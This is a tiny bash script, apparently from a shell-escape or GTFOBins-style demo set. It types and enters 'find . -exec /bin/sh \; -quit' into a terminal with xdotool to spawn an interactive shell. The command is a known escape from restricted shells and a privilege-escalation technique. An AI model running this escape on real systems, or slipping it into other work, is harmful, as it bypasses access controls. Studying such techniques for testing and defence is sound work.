#!/bin/bash

: '
find - get interactive shell using exec
'

paste_command "find . -exec /bin/sh \; -quit"
xdotool key Return
